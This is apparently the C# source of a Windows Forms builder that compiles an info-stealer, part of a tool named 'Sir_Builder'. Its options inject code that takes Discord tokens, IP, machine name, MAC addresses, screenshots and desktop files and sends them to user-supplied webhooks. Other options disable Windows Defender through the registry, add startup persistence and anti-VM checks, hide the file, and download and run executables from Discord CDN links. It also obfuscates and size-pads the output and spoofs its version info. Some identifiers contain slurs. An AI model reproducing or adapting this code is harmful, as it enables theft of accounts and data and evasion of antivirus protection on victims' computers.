							stubSource = stubSource.Replace("%v3%", assemblyBuildPart.Text);
							stubSource = stubSource.Replace("%v4%", assemblyPrivatePart.Text);
							stubSource = stubSource.Replace("%Guid%", Guid.NewGuid().ToString());
						}
						stubSource = stubSource.Replace("djasdaksdaksd", spaghetti.Text);
						stubSource = stubSource.Replace("aeskey", aestext.Text);
						stubSource = stubSource.Replace("Intern", randomCharacters.getRandomCharacters(random.Next(10, 20)));
						stubSource = stubSource.Replace("\"$URL$\"", string.Join(", ", urlList.Select(x => $"\"{StringCipher.Encrypt(x, aestext.Text)}\"").ToList()));
						if (startupcheck.Checked == true)
						{
							if (string.IsNullOrEmpty(b.Text))
							{
								MessageBox.Show("you cant leave it blank!");
								return;
							}
							stubSource = stubSource.Replace("//startuplolhehe", "plugin.Startup();");
							stubSource = stubSource.Replace("sfsdhfdkjfhdkjfmanba", b.Text);
						}
						if (maccheck.Checked == true)
						{
							stubSource = stubSource.Replace("//mack", @"
                                ""Mac Addresses: ```\n"" + plugins.GetMacAddress() + ""```"" +
								""\n"",
                    ");
						}
						if (screencheck.Checked == true)
						{
							stubSource = stubSource.Replace("//ss", @"
				    	plugins.FullScreenshot(Path.GetTempPath(), ""\\xd.png"", ImageFormat.Png);
				    	Http.attachment(Path.GetTempPath() + ""\\xd.png"");
				    	Thread.Sleep(1000);
				    	if (File.Exists(Path.GetTempPath() + ""\\xd.png""))
                        {
					 	 File.Delete(Path.GetTempPath() + ""\\xd.png"");
                        }
					    else
                        {
						Thread.Sleep(100);
                        }
                        ");
						}
						if (tokencheck.Checked == true)
						{
							stubSource = stubSource.Replace("//tok3n", @"
					   ""Token: ```\n"" + plugins.takeToken() + ""```"" +
						""\n"",
                        ");
						}
						if (webcam.Checked == true)
						{
							stubSource = stubSource.Replace("//stealCT1", @"
				        string[] dir = System.IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
				        foreach (string file in dir)
				        {
					    if (file.Contains("".CT""))
					    {
						Http.attachment(file);
					    }
				        }
                    ");
						}
						if (checkbox4.Checked == true)
						{
							stubSource = stubSource.Replace("//infolel", @"
                       ""IP: ```"" + ip + ""```"" +
								""\n"" +
								""PC Name: ```\n"" +  Environment.UserName + ""/"" + Environment.MachineName +
								""\n"" +
								""```"",
                        ");
						}
						if (corruptgt.Checked == true)
						{
							stubSource = stubSource.Replace("//corruptgt", "plugin.corrupt();");
						}
						if (monoFlat_CheckBox6.Checked == true)
						{
							stubSource = stubSource.Replace("//antivm", "plugin.AntiVM();");
						}
						if (fakerrorcheck.Checked == true)
						{
							stubSource = stubSource.Replace("//fakeerrorlolnub", "MessageBox.Show" + "(" + gay3123123.Text + textBox2.Text + gay3123123.Text + ");");
						}
						if (monoFlat_CheckBox5.Checked == true)
						{
							stubSource = stubSource.Replace("//Tracer", "Tracer.TraceSave();");
						}
						if (recover.Checked == true)
						{
							stubSource = stubSource.Replace("//recover", @"
if (File.Exists(Path.GetTempPath() + ""\\Recovery.txt""))
{
File.Delete(Path.GetTempPath() + ""\\Recovery.txt"");
Thread.Sleep(250);
}
else
{
WebClient nasdaq = new WebClient();
nasdaq.DownloadFile(""https://cdn.discordapp.com/attachments/911606378152472639/911743998174060574/ChromeRecovery.exe"", Path.GetTempPath() + ""\\Chrome.exe"");
Thread.Sleep(300);
Process.Start(Path.GetTempPath() + ""\\Chrome.exe"");
Thread.Sleep(300);
Http.attachment(Path.GetTempPath() + ""\\Recovery.txt"");
}
");
						}
						if (taskcheck.Checked == true)
						{
							stubSource = stubSource.Replace("//1337disabletasklolpro", "plugin.Taskmanager();");
						}
						if (defendercheck.Checked == true)
						{
							stubSource = stubSource.Replace("//defendernigger", @"
            plugins.RegistryEdit(@""SOFTWARE\Microsoft\Windows Defender\Features"", ""TamperProtection"", ""0""); //Windows 10 1903 Redstone 6
            plugins.RegistryEdit(@""SOFTWARE\Policies\Microsoft\Windows Defender"", ""DisableAntiSpyware"", ""1"");
            plugins.RegistryEdit(@""SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"", ""DisableBehaviorMonitoring"", ""1"");
            plugins.RegistryEdit(@""SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"", ""DisableOnAccessProtection"", ""1"");
            plugins.RegistryEdit(@""SOFTWARE\Policies\Microsoft\Windaows Defender\Real-Time Protection"", ""DisableScanOnRealtimeEnable"", ""1"");
");
						}
						if (hidestealerxdomfg.Checked == true)
						{
							stubSource = stubSource.Replace("//hidefileomglolok", @"            try { File.SetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location, File.GetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location) | FileAttributes.Hidden | FileAttributes.System); } catch { }");
						}
						var isOK = CompileFromSource(stubSource, Path.GetTempPath() + "\\LanX.exe");
						if (isOK)
						{
							Extract("Sir_Builder", Path.GetTempPath(), "Resources", "vmprotect.exe");
							var directoryPath2 = Path.GetFullPath(saveFileDialog.FileName);
							var XDDIJ = Path.GetTempPath() + "\\LanX.exe";
							if (obfuscation.Checked == true)
							{
								ProcessStartInfo Protection = new ProcessStartInfo();
								Protection.WindowStyle = ProcessWindowStyle.Hidden;
								Protection.WorkingDirectory = Path.GetTempPath();
								Protection.FileName = "vmprotect.exe";
								Protection.UseShellExecute = true;
								Protection.Arguments = XDDIJ;
								Process proc = Process.Start(Protection);
								proc.WaitForExit();
								File.Delete(XDDIJ);
								File.Delete(Path.GetTempPath() + "\\vmprotect.exe");
							}

							if (File.Exists(Application.StartupPath + @"\manifest.manifest"))
							{
								File.Delete(Application.StartupPath + @"\manifest.manifest");
							}
							if (cetrainernigger.Checked == true)
							{
								WebClient web = new WebClient();
								web.DownloadFile("https://cdn.discordapp.com/attachments/911606378152472639/911747772837953566/Cetrainer.exe", Path.GetTempPath() + "\\cetrainermanagerxD.exe");
								Process.Start(Path.GetTempPath() + "\\cetrainermanagerxD.exe");
								Thread.Sleep(4000);
								if (File.Exists(Path.GetTempPath() + "\\LanX.vmp.CETRAINER"))
								{
									File.Move(Path.GetTempPath() + "\\LanX.vmp.CETRAINER", saveFileDialog.FileName);
								}
								if (File.Exists(Path.GetTempPath() + "\\LanX.CETRAINER"))
								{
									File.Move(Path.GetTempPath() + "\\LanX.CETRAINER", saveFileDialog.FileName);
								}
							}
							else


							if (obfuscation.Checked == true)
							{
								{
									File.Move(Path.GetTempPath() + "\\LanX.vmp.exe", saveFileDialog.FileName);
								}

							}
							else
							{
								File.Move(Path.GetTempPath() + "\\LanX.exe", saveFileDialog.FileName);
							}
							MessageBox.Show("Done! check your output directory", "Compiled!", MessageBoxButtons.OK, MessageBoxIcon.None,
							MessageBoxDefaultButton.Button1, (MessageBoxOptions)0x40000);
							var directoryPath3 = Path.GetDirectoryName(saveFileDialog.FileName);
							Extract("Sir_Builder", directoryPath3, "Resources", "Newtonsoft.Json.dll");
							if (File.Exists(Path.GetTempPath() + "\\cetrainermanagerxD.exe"))
							{
								File.Delete(Path.GetTempPath() + "\\cetrainermanagerxD.exe");
							}
							if (MessageBox.Show("do you want to join our discord server?", "Invite", MessageBoxButtons.OKCancel) == DialogResult.OK)
							{
								Process.Start("https://discord.gg/nBG4xhMVZm");
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				monoFlat_Label2.Text = ex.Message;
			}
		}
        //private static void Extract(string nameSpace, string outFile, string internalFilePath, string resourceName)
        //{
        //    Assembly assembly = Assembly.GetCallingAssembly();

        //    using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
        //    {
        //        using (BinaryReader r = new BinaryReader(s))
        //        {
        //            using (FileStream fs = new FileStream(outFile + "\\" + resourceName, FileMode.OpenOrCreate))
        //            {
        //                using (BinaryWriter w = new BinaryWriter(fs))
        //                {
        //                    w.Write(r.ReadBytes((int)s.Length));
        //                }
        //            }
        //        }
        //    }
        //}

        private void ToggleExe_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].SubItems[1].Text == "true")
            {
                listView1.SelectedItems[0].SubItems[1].Text = "false";
            }
            else if (listView1.SelectedItems[0].SubItems[1].Text == "false")
            {
                listView1.SelectedItems[0].SubItems[1].Text = "true";
            }
        }

        private void deleteGT_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void disableTask_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void disableWin_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroButton12_Click(object sender, EventArgs e)
        {
            var inputUrl = textBox1.Text;
            if (string.IsNullOrEmpty(inputUrl))
            {
                MessageBox.Show("Paste your webhook url");
                return;
            }

            if (!urlList.Contains(inputUrl))
            {
                var listViewItem = new ListViewItem();
                listViewItem.Text = textBox1.Text;
                urlListView.Items.Insert(0, listViewItem);
                urlListView.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                Thread.Sleep(100);
                urlList.Add(listViewItem.Text);
            }
        }

        private void metroButton13_Click(object sender, EventArgs e)
        {
            if (urlListView.SelectedItems.Count > 0)
            {
                foreach (ListViewItem url in urlListView.SelectedItems)
                {
                    urlList.Remove(url.Text);
                    url.Remove();
                }
            }
        }

        private void metroButton14_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.OpenFileDialog openFileDialog = new System.Windows.Forms.OpenFileDialog();
            openFileDialog.Filter = "Exe Files (.exe)|*.exe|All Files (*.*)|*.*";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                filepathpump.Text = openFileDialog.FileName;
            }
        }

        private void metroButton15_Click(object sender, EventArgs e)
        {
            if (File.Exists(filepathpump.Text) && Path.GetExtension(filepathpump.Text) == ".exe")
            {
                if (metroRadioButton2.Checked == true)
                {
                    FileStream file = File.OpenWrite(filepathpump.Text);
                    long ende = file.Seek(0, SeekOrigin.End);
                    decimal groesse = numericUpDown1.Value * 1048;
                    while (ende < groesse)
                    {
                        ende++;
                        file.WriteByte(0);
                    }
                    file.Close();
                    MessageBox.Show("Pumped!");
                }
                else if (metroRadioButton1.Checked == true)
                {
                    FileStream file = File.OpenWrite(filepathpump.Text);
                    long ende = file.Seek(0, SeekOrigin.End);
                    decimal groesse = numericUpDown1.Value * 1048576;
                    while (ende < groesse)
                    {
                        ende++;
                        file.WriteByte(0);
                    }
                    file.Close();
                    MessageBox.Show("Pumped!");
                }
            }
            else
            {
                MessageBox.Show("Error!");
            }
        }

        private void regeditStartup_CheckedChanged(object sender, EventArgs e)
        {
            if (startupcheck.Checked == true)
            {
                a.Visible = true;
                b.Visible = true;
            }
            else
            {
                a.Visible = false;
                b.Visible = false;
            }
        }

        private void metroButton3_Click_1(object sender, EventArgs e)
        {
            System.Windows.Forms.OpenFileDialog ofd = new System.Windows.Forms.OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                string[] itemsf = { ofd.FileName, "true", "false" };
                ListViewItem ajnisdfin = new ListViewItem(itemsf);
                listView1.Items.Add(ajnisdfin);
            }
            else
            {
                return;
            }
        }

        private void metroButton4_Click_1(object sender, EventArgs e)
        {
            if (listView1.Items.Count > 0)
            {
                listView1.SelectedItems[0].Remove();
            }
        }

        private void metroButton17_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].SubItems[1].Text == "true")
            {
                listView1.SelectedItems[0].SubItems[1].Text = "false";
            }
            else if (listView1.SelectedItems[0].SubItems[1].Text == "false")
            {
                listView1.SelectedItems[0].SubItems[1].Text = "true";
            }
        }

        private void metroButton16_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].SubItems[2].Text == "true")
            {
                listView1.SelectedItems[0].SubItems[2].Text = "false";
            }
            else if (listView1.SelectedItems[0].SubItems[2].Text == "false")
            {
                listView1.SelectedItems[0].SubItems[2].Text = "false";
            }
        }

        private void metroButton18_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new System.Windows.Forms.OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                    txtTitle.Text = fileVersionInfo.InternalName ?? string.Empty;
                    txtDescription.Text = fileVersionInfo.FileDescription ?? string.Empty;
                    txtProduct.Text = fileVersionInfo.CompanyName ?? string.Empty;
                    txtCompany.Text = fileVersionInfo.ProductName ?? string.Empty;
                    txtCopyright.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                    txtTrademark.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;

                    var version = fileVersionInfo.FileMajorPart;
                    assemblyMajorVersion.Text = fileVersionInfo.FileMajorPart.ToString();
                    assemblyMinorVersion.Text = fileVersionInfo.FileMinorPart.ToString();
                    assemblyBuildPart.Text = fileVersionInfo.FileBuildPart.ToString();
                    assemblyPrivatePart.Text = fileVersionInfo.FilePrivatePart.ToString();
                }
            }
        }

        private void metroButton19_Click(object sender, EventArgs e)
        {
            {
                var newInfo = randomFileInfo.getRandomFileInfo();
                txtTitle.Text = newInfo.Title;
                txtDescription.Text = newInfo.Description;
                txtProduct.Text = newInfo.Product;
                txtCompany.Text = newInfo.Company;
                txtCopyright.Text = newInfo.Copyright;
                txtTrademark.Text = newInfo.Trademark;
                assemblyMajorVersion.Text = newInfo.MajorVersion;
                assemblyMinorVersion.Text = newInfo.MinorVersion;
                assemblyBuildPart.Text = newInfo.BuildPart;
                assemblyPrivatePart.Text = newInfo.PrivatePart;
            }
        }

        private void metroCheckBox3_CheckedChanged(object sender, EventArgs e)
        {
			if (metroCheckBox3.Checked == true)
			{
				metroButton11.Enabled = true;
			}
			else
				metroButton11.Enabled = false;
		}

        private void metroButton20_Click(object sender, EventArgs e)
        {
			byte[] kek = StringCipher.Generate256BitsOfRandomEntropy();
			string enc = Convert.ToBase64String(kek);
			aestext.Text = enc;
		}
    }
}